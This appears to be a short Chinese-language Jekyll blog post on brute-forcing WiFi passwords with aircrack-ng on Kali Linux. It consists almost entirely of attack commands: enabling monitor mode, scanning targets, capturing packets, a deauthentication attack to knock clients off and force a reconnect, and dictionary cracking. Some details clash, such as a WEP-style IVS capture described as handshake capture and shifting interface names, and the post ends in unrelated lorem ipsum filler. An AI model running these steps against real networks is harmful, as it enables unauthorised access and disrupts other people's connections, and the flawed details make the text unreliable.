---
layout: post
title：wifi密码暴力破解
---
<img src="/images/fulls/03.jpg" class="fit image"> 
##破解准备
  +kali系统笔记本
  +无线网卡模块
  + 安装aircrack-ng包
##实验过程
###确认网卡
  进入系统后，首先ifconfig看我们的无线网卡是否有正常工作，如果没有开启  输入airmon-ng wlan0 up加载无线网卡
  在这里wlan0就是我的网卡，现在已经正常开启。
###开启监听
>root@kali:~$ airmon-ng start wlan0
  
 ###扫描目标wifi
 >root@kali:~$ airodump-ng wlan0mon
 
 ###开始抓握手包
 >root@kali:~$ airodump-ng --ivs -w abc -c 6 mon0 

 +ivs是通过ivs过滤，只保留可以破解密码的报文.ivs文件，这样比较快点
 +-w是将抓取的报文写入命名为abc并保存（之后会在当前文件夹保存为abc-01.ivs）
 +-c后面跟频道CH，如这里的6 
 
 ###强制客户端重连
>aireplay-ng -0 1 -a AP的Mac地址 -c 客户端的Mac地址 interface
 +-0 1：表示使用Deauth攻击模式，后面的1表示攻击次数
 +-a :表示AP的Mac地址
 +-c ：表示客户端的Mac地址
 +interface：网卡
 ###使用密码本破解
  root@kali:~$ aircrack-ng abc-01.ivs -w pass-wifi.txt
  +-w是指定我的密码本

Sed lobortis urna ut mi volutpat, sit amet euismod sapien tincidunt. Nulla facilisi. Pellentesque quis tempus neque. Mauris dictum ac sapien nec congue. In hac habitasse platea dictumst. Duis id pellentesque nisl. Morbi eget massa magna.
